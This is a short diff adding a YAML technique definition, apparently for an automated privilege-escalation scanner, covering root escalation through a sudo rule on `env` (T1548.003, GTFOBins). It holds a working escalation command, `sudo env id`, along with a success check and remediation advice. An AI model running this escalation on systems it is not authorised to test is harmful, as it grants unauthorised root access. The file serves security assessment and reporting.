@@ -1,0 +1,25 @@
+# Sudo → root via env (GTFOBins)
+technique: T1548.003
+name: Sudo → root via env (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: env
+execute:
+  command: |-
+    sudo env id
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `env` — env runs its final positional argument as a command.
+  remediation: >
+    Drop `env` from sudoers. env is not safely wrappable.
+  refs: [T1548.003, GTFOBins/env]
